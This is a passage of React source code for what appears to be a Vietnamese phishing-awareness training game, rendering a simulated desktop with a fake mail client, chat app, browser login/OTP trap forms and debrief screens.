          <p className="text-sm font-semibold text-cyan-300">CyberShield Academy</p>
          <p className="min-w-0 truncate text-sm font-semibold text-white">{campaignTitle}</p>

          <div className="ml-auto flex flex-wrap items-center gap-1.5 text-[11px] font-mono">
            <span className="rounded-md border border-cyan-500/30 bg-cyan-950/45 px-2 py-1">
              {completedCount}/{queueLen || 0} Nhiệm vụ | {progressPct}%
            </span>
            <span className="rounded-md border border-amber-500/30 bg-amber-950/40 px-2 py-1">
              THREAT LEVEL {threatLevel}
            </span>
            <span className="rounded-md border border-violet-500/30 bg-violet-950/35 px-2 py-1">
              SCORE {score}
            </span>
            <span className={['rounded-md px-2 py-1 font-semibold', statusCls].join(' ')}>{status}</span>
          </div>
        </div>
      </header>

      <main className="relative z-10 mx-auto w-full max-w-7xl px-4 py-0 sm:px-6">
        <section className="hidden rounded-2xl border border-slate-700/60 bg-[#0b1424]/90 p-4 shadow-[0_18px_50px_rgba(0,0,0,0.4)]">
          <div className="flex flex-wrap items-center gap-3">
            <div className="inline-flex h-10 w-10 items-center justify-center rounded-lg border border-cyan-500/30 bg-cyan-950/50 text-cyan-200">
              <Network className="h-5 w-5" />
            </div>
            <div className="min-w-0">
              <p className="text-sm font-semibold text-cyan-300">CyberShield Academy</p>
              <p className="truncate text-sm font-semibold text-white">{campaignTitle}</p>
            </div>
          </div>
          <div className="mt-3 flex flex-wrap items-center gap-2 text-xs font-mono">
            <span className="rounded-md border border-cyan-500/30 bg-cyan-950/45 px-2 py-1">
              {completedCount}/{queueLen || 0} Nhiệm vụ hoàn thành | {progressPct}%
            </span>
            <span className="rounded-md border border-amber-500/30 bg-amber-950/40 px-2 py-1">
              THREAT LEVEL {threatLevel}
            </span>
            <span className="rounded-md border border-violet-500/30 bg-violet-950/35 px-2 py-1">
              SCORE {score}
            </span>
            <span className={['rounded-md px-2 py-1 font-semibold', statusCls].join(' ')}>{status}</span>
          </div>
        </section>
      </main>

      <DesktopEnvironment onReportPhishing={handleReportPhishing}>
        {error ? (
          <div className="absolute left-10 right-10 top-3 z-[9] rounded-xl border border-red-400/25 bg-red-950/40 p-3 text-sm text-red-100">
            {error}
          </div>
        ) : null}

        <div
          className="pointer-events-none absolute inset-0 flex items-center justify-center"
          style={{ zIndex: activeApp === 'mail' ? 100 : 50 }}
        >
          <Draggable
            nodeRef={mailWindowNodeRef}
            handle=".window-header"
            onStart={() => setActiveApp('mail')}
          >
            <div ref={mailWindowNodeRef} className="pointer-events-auto">
            <AppWindow
              title={appWindowTitle}
              className="w-[920px] h-[640px]"
              onMouseDown={() => setActiveApp('mail')}
            >
              {isLoading ? (
                <div className="h-full animate-pulse bg-slate-900/60" />
              ) : isFinished ? (
                <section className="flex h-full flex-col items-center justify-center bg-slate-900 text-slate-100">
                  <p className="font-mono text-xs uppercase tracking-widest text-cyan-300/80">
                    SYSTEM REPORT - DEBRIEFING
                  </p>
                  <p className="mt-2 text-lg font-semibold text-cyan-200">Đang tổng hợp kết quả mission...</p>
                </section>
              ) : (
                <GmailWindow
                  queue={queue}
                  currentIndex={index}
                  currentEmail={currentEmail}
                  scenarioType={scenarioType}
                  status={status}
                  hoveredUrl={hoveredUrl}
                  onHoverUrl={setHoveredUrl}
                  onSenderToggle={() => {
                    setSenderTooltipOpen((v) => !v)
                    gameActions.markInspectedSender()
                  }}
                  senderTooltipOpen={senderTooltipOpen}
                  canAct={canAct}
                  canVerifyMail={canVerifyMail}
                  attachmentSpec={attachmentSpec}
                  onFileDownload={handleFileDownload}
                  onLinkClick={handleLinkClick}
                  onVerifyMail={handleVerifyMail}
                  mailOtpMode={false}
                  isShaking={isShaking}
                />
              )}
            </AppWindow>
            </div>
          </Draggable>
        </div>

        {scenarioType === 'MAIL_WEB' ? (
          <div
            className="pointer-events-none absolute inset-0"
            style={{ zIndex: activeApp === 'notepad' ? 95 : 60 }}
          >
            <Draggable
              nodeRef={notepadWindowNodeRef}
              handle=".window-header"
              defaultPosition={notepadDefaultPosition}
              onStart={() => setActiveApp('notepad')}
            >
              <div ref={notepadWindowNodeRef} className="pointer-events-auto">
                <AppWindow
                  title="Passwords.txt - Notepad"
                  className="h-[360px] w-[290px]"
                  onMouseDown={() => setActiveApp('notepad')}
                >
                  <div className="h-full bg-[#f4f4f4] p-2">
                    <pre className="h-full overflow-auto whitespace-pre-wrap bg-white p-2 font-mono text-[11px] leading-relaxed text-slate-800">
                      {notepadContent}
                    </pre>
                  </div>
                </AppWindow>
              </div>
            </Draggable>
          </div>
        ) : null}

        {scenarioType === 'MAIL_ZALO' ? (
          <Draggable
            nodeRef={chatWindowNodeRef}
            handle=".window-header"
            defaultPosition={{ x: 960, y: 150 }}
            onStart={() => setActiveApp('chat')}
          >
            <div ref={chatWindowNodeRef}>
              <AppWindow
                title="CompanyChat - Zalo"
                className="w-[350px] h-[550px]"
                onMouseDown={() => setActiveApp('chat')}
              >
                <FakeZaloPanel
                  content={playContext?.content}
                  replyText={zaloReply}
                  onReplyChange={setZaloReply}
                  onReport={handleReportPhishing}
                  onTrustSend={() => {}}
                  canReport={canAct}
                  canTrustSend={false}
                />
              </AppWindow>
            </div>
          </Draggable>
        ) : null}

        {gameState.ui.isBrowserOpen ? (
          <div
            className="absolute inset-0 pointer-events-none"
            style={{ zIndex: activeApp === 'browser' ? 100 : 50 }}
          >
            <Draggable
              nodeRef={browserWindowNodeRef}
              handle=".window-header"
              defaultPosition={{ x: 240, y: 100 }}
              onStart={() => setActiveApp('browser')}
            >
              <div
                ref={browserWindowNodeRef}
                className="absolute pointer-events-auto overflow-hidden rounded-xl border border-slate-500 bg-white shadow-2xl"
                onMouseDown={() => setActiveApp('browser')}
              >
                <div className="h-[600px] w-[800px]">
                  <FakeBrowserWindow
                    title={scenarioModel?.traps?.browser?.title}
                    displayUrl={scenarioModel?.traps?.browser?.displayUrl || gameState.trap.openedUrl}
                    webType={activeWebType}
                    formType={isMailOtpScenario ? 'OTP' : scenarioModel?.traps?.browser?.formType}
                    loginUser={browserUser}
                    loginPass={browserPass}
                    otpInput={browserOtp}
                    onLoginUserChange={setBrowserUser}
                    onLoginPassChange={setBrowserPass}
                    onOtpChange={setBrowserOtp}
                    onClose={() => {
                      if (isMailOtpScenario && otpTrapBusyRef.current) return
                      if (scenarioType === 'MAIL_WEB' && webTrapBusy) return
                      handleCloseBrowser()
                    }}
                    onSubmitTrap={handleSubmitBrowserTrap}
                    canSubmitTrap={canTrustBrowserTrap}
                    closeDisabled={isMailOtpScenario && otpTrapBusy}
                  />
                </div>
              </div>
            </Draggable>
          </div>
        ) : null}
        {scenarioType.startsWith('MAIL_') ? (
          <MailAttachmentSimulator
            open={attachmentModalOpen}
            spec={attachmentSpec}
            onClose={() => setAttachmentModalOpen(false)}
            onDownload={handleAttachmentDownload}
            onReviewed={() => {
              setOpenedAttachmentIds((prev) => {
                const id = currentEmail?.id
                if (id == null) return prev
                if (prev.some((x) => String(x) === String(id))) return prev
                return [...prev, id]
              })
            }}
          />
        ) : null}
        <PhoneOtpWidget visible={showPhoneOtpPreview} code={generatedOtp} />
      </DesktopEnvironment>

      {status === 'GAME_OVER' ? (
        <TeachableMomentOverlay
          gameOverEmail={gameOverEmail}
          gameOverNonMail={gameOverNonMail}
          onContinue={() => {
            setGameOverEmail(null)
            setGameOverNonMail(false)
            if (deferredDebriefRef.current) {
              setDebriefData(deferredDebriefRef.current)
              deferredDebriefRef.current = null
              return
            }
            setIsFinished(true)
          }}
          onRetry={loadBySessionId}
        />
      ) : null}

      {status === 'VICTORY' && isFinished ? (
        <div className="fixed bottom-5 right-5 z-20 rounded-xl border border-emerald-400/40 bg-emerald-950/60 px-4 py-3 text-sm text-emerald-100 shadow-[0_0_22px_rgba(52,211,153,0.2)]">
          <div className="flex items-center gap-2">
            <ShieldAlert className="h-4 w-4" />
            Ca trực hoàn tất - Không bị lừa.
          </div>
        </div>
      ) : null}

      {isSubmittingResult ? (
        <div className="fixed inset-0 z-40 flex items-center justify-center bg-black/55 backdrop-blur-sm">
          <div className="rounded-xl border border-cyan-400/30 bg-slate-950/85 px-5 py-3 text-sm font-mono text-cyan-200">
            Uploading mission report...
          </div>
        </div>
      ) : null}

      {debriefData ? (
        <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-slate-900/95 p-4 backdrop-blur-md">
          <div className="w-[800px] max-h-[90vh] overflow-y-auto">
            <DebriefOverlayPanel
              report={debriefData}
              finalScore={debriefData.finalScore}
              timeTakenSeconds={debriefData.timeTakenSeconds}
              onRetry={() => {
                setDebriefData(null)
                loadBySessionId()
              }}
              onBackCampaign={() => navigate('/campaigns')}
            />
          </div>
        </div>
      ) : null}

      <style>{`
        @keyframes wiggle {
          0% { transform: translateX(0); }
          25% { transform: translateX(-4px); }
          50% { transform: translateX(4px); }
          75% { transform: translateX(-3px); }
          100% { transform: translateX(0); }
        }
      `}</style>
    </div>
  )
}

export default function SurvivalInbox() {
  return (
    <GameStateProvider>
      <SurvivalInboxScreen />
    </GameStateProvider>
  )
}
